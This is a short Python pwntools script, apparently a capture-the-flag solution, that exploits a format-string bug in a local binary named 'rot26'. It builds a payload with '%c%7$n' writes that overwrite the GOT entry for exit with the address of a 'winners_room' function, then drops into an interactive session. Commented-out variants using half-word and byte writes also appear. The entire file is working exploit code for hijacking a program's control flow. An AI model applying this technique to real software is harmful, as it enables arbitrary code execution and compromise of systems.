from pwn import *

e = ELF('./rot26')
p = process('./rot26')

exit_addr = 0x804a020 #e.got['exit']
winners_room_addr = e.symbols['winners_room'] # 0x08048737 #.symbols['winners_room']

payload = p32(exit_addr)

## This is success.
'''
payload += '%' + str(winners_room_addr-4) + 'c%7$n'
'''

#payload += p32(exit_addr+2)
tmp = int(0x08048737) - 4
payload += '%' + str(tmp) + 'c%7$n'
#tmp = int(0x10804) - tmp
#payload += '%' + str(tmp) + 'c%8$hn'
'''
tmp = int(0x104) - tmp
payload += '%' + str(tmp) + 'c%9$hhn'
tmp = int(0x108) - tmp
payload += '%' + str(tmp) + 'c%10$hhn'
'''

print payload
p.sendline(payload)
p.interactive()
print p.recv()
